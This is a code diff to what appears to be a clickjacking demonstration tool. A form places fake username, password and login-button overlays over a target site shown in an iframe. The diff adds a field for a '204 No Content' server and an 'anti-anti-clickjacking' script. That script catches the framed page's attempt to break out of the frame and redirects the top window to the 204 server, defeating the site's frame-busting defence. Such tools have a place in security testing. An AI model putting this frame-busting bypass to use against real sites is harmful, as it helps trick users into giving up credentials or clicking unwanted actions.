@@ -94,8 +94,9 @@
                 var passwordStyle = '&passwordStyle=' + $('#inputPasswordStyle').val();
                 var buttonStyle = '&buttonStyle=' + $('#inputButtonStyle').val();
 
+                var server204Response = $('#input204Response').val();
 
-                var demoUrl = "sandbox.html?target=" + newTarget + '&userNameLeft=' + emailX + '&userNameTop=' + emailY + '&passwordLeft=' + passwordX + '&passwordTop=' + passwordY + '&buttonLeft=' + buttonX + '&buttonTop=' + buttonY;
+                var demoUrl = "sandbox.html?target=" + newTarget + '&userNameLeft=' + emailX + '&userNameTop=' + emailY + '&passwordLeft=' + passwordX + '&passwordTop=' + passwordY + '&buttonLeft=' + buttonX + '&buttonTop=' + buttonY + '&server204Response=' + server204Response;
                 demoUrl += encodeURIComponent(usernameStyle);
                 demoUrl += encodeURIComponent(passwordStyle);
                 demoUrl += encodeURIComponent(buttonStyle);
@@ -162,6 +163,14 @@
             </div>
 
             <div class="form-group">
+                <label for="inputButtonStyle" class="col-lg-2 control-label">204 Response Server</label>
+
+                <div class="col-lg-10">
+                    <input type="text" class="form-control" id="input204Response" placeholder="http://yourserver.com/204-no-content-response">
+                </div>
+            </div>
+
+            <div class="form-group">
                 <label for="inputButtonStyle" class="col-lg-2 control-label">JavaScript</label>
 
                 <div class="col-lg-10">
@@ -195,6 +204,18 @@
     <button type="submit" id="jacksButton" class="">Login
     </button>
 </div>
+
+<!-- Anti-anti-clickjacking code -->
+<script type="text/javascript">
+    var prevent_bust = 0  
+    window.onbeforeunload = function() { prevent_bust++ }  
+    setInterval(function() {  
+      if (prevent_bust > 0) {  
+        prevent_bust -= 2  
+        window.top.location = $('#input204Response').val()
+      }  
+    }, 1)  
+</script>
 
 
 <iframe id="targetIframe" scrolling="no" frameBorder="0"
